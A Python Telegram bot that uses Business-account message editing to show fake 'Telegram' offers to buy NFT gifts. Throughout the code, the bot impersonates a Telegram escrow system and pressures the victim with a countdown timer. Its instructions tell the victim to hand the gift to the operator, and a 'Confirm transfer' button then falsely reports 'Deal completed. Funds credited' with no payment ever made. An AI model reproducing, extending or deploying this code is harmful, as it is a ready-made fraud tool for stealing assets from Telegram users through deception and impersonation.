import asyncio
import logging
import os
import random
import re
import string
import time
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import (
    Message,
    InlineKeyboardButton,
    CallbackQuery,
    BusinessConnection,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.utils.markdown import hide_link

# ================= НАСТРОЙКИ =================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN не задан")

RECIPIENT_USERNAME = "vvl_society"

OFFER_TTL_SECONDS = 6 * 60 * 60
TIMER_TICK = 60

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)
logging.getLogger("aiogram").setLevel(logging.WARNING)
logging.getLogger("aiogram.dispatcher").setLevel(logging.WARNING)
logging.getLogger("aiogram.event").setLevel(logging.WARNING)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

active_deals = {}
deal_timers = {}


# ================= ГЕНЕРАЦИЯ ОРДЕРА =================
def generate_order_id():
    """Уникальный ордер вида TG-A7K9P2X4 (8 символов)."""
    chars = string.ascii_uppercase + string.digits
    code = "".join(random.choice(chars) for _ in range(8))
    return f"TG-{code}"


# ================= ТЕКСТЫ =================
TEXTS = {
    "ru": {
        "usage": (
            "⚠️ <b>Использование:</b>\n"
            "<code>.buy &lt;ссылка_на_NFT&gt; &lt;сумма&gt; &lt;валюта&gt; [eu]</code>\n\n"
            "<b>Пример:</b>\n"
            "<code>.buy https://t.me/nft/ViceCream-302895 1000 STARS</code>"
        ),
        "invalid_link": (
            "⚠️ <b>Неверная ссылка на NFT.</b>\n\n"
            "Формат: <code>https://t.me/nft/Название-Номер</code>"
        ),
        "header": "Telegram",
        "offer": "Пользователь {author} предлагает вам",
        "for_gift": "за подарок",
        "valid_for": "Оффер действителен ещё",
        "decline_btn": "❌ Отклонить",
        "accept_btn": "✅ Принять",
        "declined": "❌ <b>Предложение отклонено</b>",
        "expired": "❌ <b>Сделка отклонена</b>",
        "alert_title": (
            "⚠️Внимание!\n\n"
            "Следуйте инструкции, чтобы не потерять подарок и получить оплату."
        ),
        "deal_lost": "⚠️ Ошибка: данные о сделке утеряны.",
        "deal_title": "NFT Deal",
        "order_prefix": "Ордер",
        "buyer_reserved": "Покупатель зарезервировал",
        "via_escrow": "через эскроу-систему Telegram.",
        "escrow_text": (
            "Средства хранятся на специальном эскроу-счёте и будут автоматически "
            "зачислены на ваш баланс Telegram Stars сразу после передачи подарка."
        ),
        "instructions": "Инструкция для завершения сделки:",
        "step1": "1. Передайте подарок пользователю: {recipient}",
        "step2_prefix": "2. Нажмите «Передать NFT» и выберите {nft}",
        "step3": "3. Подтвердите передачу подарка.",
        "final_note": (
            "Telegram зафиксирует транзакцию и моментально зачислит "
            "<b>{amount} {currency}</b> на ваш баланс. Резерв действует 24 часа."
        ),
        "transfer_btn": "📤 Передать NFT",
        "confirm_btn": "✅ Подтвердить передачу",
        "confirmed": "✅ Транзакция подтверждена!",
        "deal_done": "✅ <b>Сделка завершена.</b> Средства зачислены на баланс.",
    },
    "en": {
        "usage": (
            "⚠️ <b>Usage:</b>\n"
            "<code>.buy &lt;NFT_link&gt; &lt;amount&gt; &lt;currency&gt; [eu]</code>\n\n"
            "<b>Example:</b>\n"
            "<code>.buy https://t.me/nft/ViceCream-302895 1000 STARS</code>"
        ),
        "invalid_link": "⚠️ <b>Invalid NFT link.</b>",
        "header": "Telegram",
        "offer": "User {author} is offering you",
        "for_gift": "for the gift",
        "valid_for": "This offer expires in",
        "decline_btn": "❌ Decline",
        "accept_btn": "✅ Accept",
        "declined": "❌ <b>Offer declined</b>",
        "expired": "❌ <b>Deal expired</b>",
        "alert_title": (
            "⚠️ <b>Attention!</b>\n\n"
            "Follow the instructions to not lose the gift and receive payment."
        ),
        "deal_lost": "⚠️ Error: deal data lost.",
        "deal_title": "NFT Deal",
        "order_prefix": "Order",
        "buyer_reserved": "The buyer has reserved",
        "via_escrow": "via the Telegram escrow system.",
        "escrow_text": (
            "The funds are held in a special escrow account and will be automatically "
            "credited to your Telegram Stars balance right after the gift is transferred."
        ),
        "instructions": "Instructions to complete the deal:",
        "step1": "1. Transfer the gift to: {recipient}",
        "step2_prefix": "2. Click «Transfer NFT» and choose {nft}",
        "step3": "3. Confirm the gift transfer.",
        "final_note": (
            "Telegram will credit <b>{amount} {currency}</b> to your balance. "
            "Reservation valid 24 hours."
        ),
        "transfer_btn": "📤 Transfer NFT",
        "confirm_btn": "✅ Confirm transfer",
        "confirmed": "✅ Transaction confirmed!",
        "deal_done": "✅ <b>Deal completed.</b>",
    },
}


# ================= ПАРСИНГ =================
NFT_LINK_RE = re.compile(r"t\.me/nft/(.+?)-(\d+)(?:\?|$|/)")


def parse_nft_link(url):
    match = NFT_LINK_RE.search(url)
    if not match:
        return None
    name, number = match.group(1), match.group(2)
    return {"name": name, "number": number, "full": f"{name} #{number}", "url": url}


def parse_buy_args(text):
    args = text.split()
    lang = "ru"
    if len(args) >= 2 and args[-1].lower() == "eu":
        lang = "en"
        args = args[:-1]
    if len(args) < 4:
        return None
    return lang, args[1], args[2], args[3].upper()


def format_time_left(seconds_left):
    if seconds_left < 0:
        seconds_left = 0
    minutes, _ = divmod(seconds_left, 60)
    hours, minutes = divmod(minutes, 60)
    if hours > 0:
        return f"{hours} ч. {minutes} мин."
    return f"{minutes} мин."


def format_number(n: str) -> str:
    try:
        return f"{int(n):,}"
    except ValueError:
        return n


def format_currency(currency: str) -> str:
    c = currency.upper()
    if c in ("STARS", "STAR"):
        return "Stars"
    return currency


def build_offer_text(t, nft_name, nft_number, nft_url, amount, currency, seconds_left,
                     author_name, author_id):
    """Карточка оффера со скрытой ссылкой (hide_link) + превью."""
    hidden = hide_link(nft_url)

    nft_display = (
        f'<a href="{nft_url}">{nft_name} #{format_number(nft_number)}</a>'
    )
    author_display = f'<a href="tg://user?id={author_id}">{author_name}</a>'
    cur = format_currency(currency)

    return (
        f"{hidden}"
        f"<b>{t['header']}</b>\n"
        f"{nft_display}\n\n"
        f"{t['offer'].format(author=author_display)}\n"
        f"<b>{amount} {cur}</b> {t['for_gift']} {nft_display}.\n\n"
        f"{t['valid_for']} {format_time_left(seconds_left)}."
    )


def build_offer_keyboard(t, deal_id, lang):
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text=t["decline_btn"], callback_data=f"dec:{deal_id}:{lang}"),
        InlineKeyboardButton(text=t["accept_btn"], callback_data=f"acc:{deal_id}:{lang}"),
    )
    return b


def build_final_text(t, deal):
    """
    Финальный экран:
    - Уникальный ордер
    - НИК АВТОРА (.buy) кликабельно → профиль
    - NFT-название кликабельно + #30,895 с запятой
    - БЕЗ строки "Ссылка на подарок"
    """
    # NFT → имя и номер с запятой
    nft_title = deal["title"]
    parts = nft_title.rsplit("#", 1)
    if len(parts) == 2:
        nft_name_clean = parts[0].strip()
        nft_num_fmt = format_number(parts[1].strip())
        nft_display = (
            f'<a href="{deal["link"]}">{nft_name_clean} #{nft_num_fmt}</a>'
        )
    else:
        nft_display = f'<a href="{deal["link"]}">{nft_title}</a>'

    # ✅ НИК АВТОРА (.buy) — кликабельно на профиль
    author_display = (
        f'<a href="tg://user?id={deal["author_id"]}">{deal["author_name"]}</a>'
    )

    cur = format_currency(deal["currency"])
    order_id = deal["order_id"]

    return (
        f"<b>{t['deal_title']}</b>\n\n"
        f"{t['order_prefix']} #{order_id}\n\n"
        f"{t['buyer_reserved']} <b>{deal['amount']} {cur}</b> {t['via_escrow']}\n"
        f"{t['escrow_text']}\n\n"
        f"<b>{t['instructions']}</b>\n"
        f"{t['step1'].format(recipient=author_display)}\n"
        f"{t['step2_prefix'].format(nft=nft_display)}\n"
        f"{t['step3']}\n\n"
        f"{t['final_note'].format(amount=deal['amount'], currency=cur)}"
    )


def build_final_keyboard(t, deal, deal_id, lang):
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text=t["transfer_btn"], url=deal["link"]))
    b.row(InlineKeyboardButton(text=t["confirm_btn"], callback_data=f"cfm:{deal_id}:{lang}"))
    return b


# ================= ТАЙМЕР =================
async def offer_timer(deal_id: str):
    deal = active_deals.get(deal_id)
    if not deal:
        return
    t = TEXTS.get(deal["lang"], TEXTS["ru"])
    has_kb = deal.get("has_kb", True)

    try:
        while True:
            await asyncio.sleep(TIMER_TICK)
            deal = active_deals.get(deal_id)
            if not deal:
                return

            seconds_left = int(deal["expires_at"] - time.time())

            if seconds_left <= 0:
                try:
                    if deal["bc_id"]:
                        await bot.edit_message_text(
                            text=t["expired"],
                            business_connection_id=deal["bc_id"],
                            chat_id=deal["chat_id"],
                            message_id=deal["message_id"],
                            parse_mode="HTML",
                        )
                except Exception as e:
                    if "MESSAGE_ID_INVALID" not in str(e):
                        logging.error(f"timer expire edit fail: {e}")
                active_deals.pop(deal_id, None)
                deal_timers.pop(deal_id, None)
                return

            try:
                text = build_offer_text(
                    t,
                    deal["nft_name"],
                    deal["nft_number"],
                    deal["link"],
                    deal["amount"],
                    deal["currency"],
                    seconds_left,
                    deal["author_name"],
                    deal["author_id"],
                )
                kb = build_offer_keyboard(t, deal_id, deal["lang"]).as_markup() if has_kb else None

                if deal["bc_id"]:
                    await bot.edit_message_text(
                        text=text,
                        business_connection_id=deal["bc_id"],
                        chat_id=deal["chat_id"],
                        message_id=deal["message_id"],
                        reply_markup=kb,
                        parse_mode="HTML",
                        disable_web_page_preview=False,
                    )
            except Exception as e:
                if "MESSAGE_ID_INVALID" not in str(e):
                    logging.error(f"timer tick edit fail: {e}")
    except asyncio.CancelledError:
        return


def stop_timer(deal_id: str):
    task = deal_timers.pop(deal_id, None)
    if task and not task.done():
        task.cancel()


# ================= /start =================
@dp.message(Command("start"))
async def cmd_start(message: Message):
    logging.info(f"[START] user_id={message.from_user.id}")
    await message.answer(
        "👋 <b>Привет!</b>\n\n"
        "Я — бот для автоматизации Telegram Business.\n\n"
        "📌 <b>Команды:</b>\n"
        "<code>.buy &lt;ссылка&gt; &lt;сумма&gt; &lt;валюта&gt;</code> — оффер с кнопками\n"
        "<code>.test &lt;ссылка&gt; &lt;сумма&gt; &lt;валюта&gt;</code> — карточка без кнопок\n\n"
        "<b>Пример:</b>\n"
        "<code>.buy https://t.me/nft/ViceCream-302895 1000 STARS</code>",
        parse_mode="HTML",
    )


# ================= ОБРАБОТКА .buy =================
async def process_buy(message: Message, bc_id):
    parsed = parse_buy_args(message.text)
    t = TEXTS["ru"]

    if not parsed:
        try:
            if bc_id:
                await bot.edit_message_text(
                    text=t["usage"],
                    business_connection_id=bc_id,
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    parse_mode="HTML",
                )
            else:
                await message.answer(t["usage"], parse_mode="HTML")
        except Exception as e:
            if "MESSAGE_ID_INVALID" not in str(e):
                logging.error(f"usage edit fail: {e}")
        return

    lang, nft_link, amount, currency = parsed
    t = TEXTS[lang]

    nft_data = parse_nft_link(nft_link)
    if not nft_data:
        try:
            if bc_id:
                await bot.edit_message_text(
                    text=t["invalid_link"],
                    business_connection_id=bc_id,
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    parse_mode="HTML",
                )
            else:
                await message.answer(t["invalid_link"], parse_mode="HTML")
        except Exception as e:
            if "MESSAGE_ID_INVALID" not in str(e):
                logging.error(f"invalid_link edit fail: {e}")
        return

    nft_name = nft_data["name"]
    nft_number = nft_data["number"]
    nft_title = nft_data["full"]

    author_name = message.from_user.first_name if message.from_user else "?"
    author_id = message.from_user.id if message.from_user else 0

    deal_id = f"{message.chat.id}_{message.message_id}"
    expires_at = time.time() + OFFER_TTL_SECONDS

    text = build_offer_text(
        t, nft_name, nft_number, nft_link, amount, currency, OFFER_TTL_SECONDS,
        author_name, author_id,
    )
    kb = build_offer_keyboard(t, deal_id, lang).as_markup()

    try:
        if bc_id:
            await bot.edit_message_text(
                text=text,
                business_connection_id=bc_id,
                chat_id=message.chat.id,
                message_id=message.message_id,
                reply_markup=kb,
                parse_mode="HTML",
                disable_web_page_preview=False,
            )
        else:
            await message.answer(
                text=text, reply_markup=kb,
                parse_mode="HTML", disable_web_page_preview=False,
            )
    except Exception as e:
        if "MESSAGE_ID_INVALID" not in str(e):
            logging.error(f"offer edit fail: {e}")
        return

    active_deals[deal_id] = {
        "link": nft_link,
        "amount": amount,
        "currency": currency,
        "title": nft_title,
        "nft_name": nft_name,
        "nft_number": nft_number,
        "lang": lang,
        "user_id": message.from_user.id,
        "chat_id": message.chat.id,
        "bc_id": bc_id,
        "expires_at": expires_at,
        "message_id": message.message_id,
        "has_kb": True,
        "author_name": author_name,
        "author_id": author_id,
    }

    deal_timers[deal_id] = asyncio.create_task(offer_timer(deal_id))


# ================= ОБРАБОТКА .test =================
async def process_test(message: Message, bc_id):
    parsed = parse_buy_args(message.text)
    t = TEXTS["ru"]

    if not parsed:
        try:
            if bc_id:
                await bot.edit_message_text(
                    text=t["usage"],
                    business_connection_id=bc_id,
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    parse_mode="HTML",
                )
            else:
                await message.answer(t["usage"], parse_mode="HTML")
        except Exception as e:
            if "MESSAGE_ID_INVALID" not in str(e):
                logging.error(f"usage edit fail: {e}")
        return

    lang, nft_link, amount, currency = parsed
    t = TEXTS[lang]

    nft_data = parse_nft_link(nft_link)
    if not nft_data:
        try:
            if bc_id:
                await bot.edit_message_text(
                    text=t["invalid_link"],
                    business_connection_id=bc_id,
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    parse_mode="HTML",
                )
            else:
                await message.answer(t["invalid_link"], parse_mode="HTML")
        except Exception as e:
            if "MESSAGE_ID_INVALID" not in str(e):
                logging.error(f"invalid_link edit fail: {e}")
        return

    nft_name = nft_data["name"]
    nft_number = nft_data["number"]
    nft_title = nft_data["full"]

    author_name = message.from_user.first_name if message.from_user else "?"
    author_id = message.from_user.id if message.from_user else 0

    deal_id = f"{message.chat.id}_{message.message_id}"
    expires_at = time.time() + OFFER_TTL_SECONDS

    text = build_offer_text(
        t, nft_name, nft_number, nft_link, amount, currency, OFFER_TTL_SECONDS,
        author_name, author_id,
    )

    try:
        if bc_id:
            await bot.edit_message_text(
                text=text,
                business_connection_id=bc_id,
                chat_id=message.chat.id,
                message_id=message.message_id,
                parse_mode="HTML",
                disable_web_page_preview=False,
            )
        else:
            await message.answer(
                text=text,
                parse_mode="HTML", disable_web_page_preview=False,
            )
    except Exception as e:
        if "MESSAGE_ID_INVALID" not in str(e):
            logging.error(f"test offer edit fail: {e}")
        return

    active_deals[deal_id] = {
        "link": nft_link,
        "amount": amount,
        "currency": currency,
        "title": nft_title,
        "nft_name": nft_name,
        "nft_number": nft_number,
        "lang": lang,
        "user_id": message.from_user.id,
        "chat_id": message.chat.id,
        "bc_id": bc_id,
        "expires_at": expires_at,
        "message_id": message.message_id,
        "has_kb": False,
        "author_name": author_name,
        "author_id": author_id,
    }

    deal_timers[deal_id] = asyncio.create_task(offer_timer(deal_id))


# ================= BUSINESS =================
@dp.business_message()
async def handle_business_message(message: Message):
    bc_id = message.business_connection_id
    if not bc_id:
        return

    if message.text and message.text.startswith("/"):
        return

    logging.info(
        f"[BUSINESS MSG] bc_id={bc_id}, chat={message.chat.id}, "
        f"from={message.from_user.id if message.from_user else '?'}, "
        f"text={message.text!r}"
    )

    if message.text and message.text.startswith(".buy"):
        logging.info(f"[BUSINESS BUY] bc_id={bc_id}")
        await process_buy(message, bc_id)
        return

    if message.text and message.text.startswith(".test"):
        logging.info(f"[BUSINESS TEST] bc_id={bc_id}")
        await process_test(message, bc_id)
        return


# ================= ОБЫЧНЫЙ БОТ =================
@dp.message(Command("buy"))
@dp.message(F.text.startswith(".buy"))
async def handle_regular_buy(message: Message):
    logging.info(f"[REGULAR BUY] user={message.from_user.id}")
    await process_buy(message, None)


@dp.message(F.text.startswith(".test"))
async def handle_regular_test(message: Message):
    logging.info(f"[REGULAR TEST] user={message.from_user.id}")
    await process_test(message, None)


@dp.business_connection()
async def on_business_connection(conn: BusinessConnection):
    logging.info(
        f"[BUSINESS CONNECTION] bc_id={conn.id}, user={conn.user.id}, "
        f"can_reply={conn.rights.can_reply}, can_read={conn.rights.can_read_messages}"
    )


# ================= CALLBACKS =================
@dp.callback_query(F.data.startswith("dec:"))
async def process_decline(cb: CallbackQuery):
    _, deal_id, lang = cb.data.split(":")
    t = TEXTS.get(lang, TEXTS["ru"])
    deal = active_deals.get(deal_id)
    stop_timer(deal_id)
    try:
        if deal and deal["bc_id"]:
            await bot.edit_message_text(
                text=t["declined"],
                business_connection_id=deal["bc_id"],
                chat_id=deal["chat_id"],
                message_id=deal["message_id"],
                parse_mode="HTML",
            )
        else:
            await cb.message.edit_text(t["declined"], parse_mode="HTML")
    except Exception as e:
        if "MESSAGE_ID_INVALID" not in str(e):
            logging.error(f"decline edit fail: {e}")
    active_deals.pop(deal_id, None)
    await cb.answer()


@dp.callback_query(F.data.startswith("acc:"))
async def process_accept(cb: CallbackQuery):
    _, deal_id, lang = cb.data.split(":")
    t = TEXTS.get(lang, TEXTS["ru"])
    deal = active_deals.get(deal_id)
    if not deal:
        await cb.answer(t["deal_lost"], show_alert=True)
        return
    stop_timer(deal_id)
    await cb.answer(text=t["alert_title"], show_alert=True)
    await asyncio.sleep(2)

    # ✅ Уникальный ордер
    deal["order_id"] = generate_order_id()

    text = build_final_text(t, deal)
    kb = build_final_keyboard(t, deal, deal_id, lang).as_markup()
    try:
        if deal["bc_id"]:
            await bot.edit_message_text(
                text=text,
                business_connection_id=deal["bc_id"],
                chat_id=deal["chat_id"],
                message_id=deal["message_id"],
                reply_markup=kb,
                parse_mode="HTML",
                disable_web_page_preview=False,
            )
        else:
            await cb.message.edit_text(
                text=text, reply_markup=kb,
                parse_mode="HTML", disable_web_page_preview=False,
            )
    except Exception as e:
        if "MESSAGE_ID_INVALID" not in str(e):
            logging.error(f"accept edit fail: {e}")


@dp.callback_query(F.data.startswith("cfm:"))
async def process_confirm(cb: CallbackQuery):
    _, deal_id, lang = cb.data.split(":")
    t = TEXTS.get(lang, TEXTS["ru"])
    deal = active_deals.get(deal_id)
    await cb.answer(t["confirmed"], show_alert=True)
    try:
        if deal and deal["bc_id"]:
            await bot.edit_message_text(
                text=t["deal_done"],
                business_connection_id=deal["bc_id"],
                chat_id=deal["chat_id"],
                message_id=deal["message_id"],
                parse_mode="HTML",
            )
        else:
            await cb.message.edit_text(t["deal_done"], parse_mode="HTML")
    except Exception as e:
        if "MESSAGE_ID_INVALID" not in str(e):
            logging.error(f"confirm edit fail: {e}")
    active_deals.pop(deal_id, None)


# ================= WEB + MAIN =================
async def handle(request):
    return web.Response(text="Bot is alive!")


async def main():
    logging.info("[START] Bot started — уникальный ордер + кликабельный автор")

    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 8080))).start()

    await bot.delete_webhook(drop_pending_updates=True)
    logging.info("[CLEANUP] Накопленные апдейты сброшены")

    await dp.start_polling(bot, drop_pending_updates=True)


if __name__ == "__main__":
    asyncio.run(main())
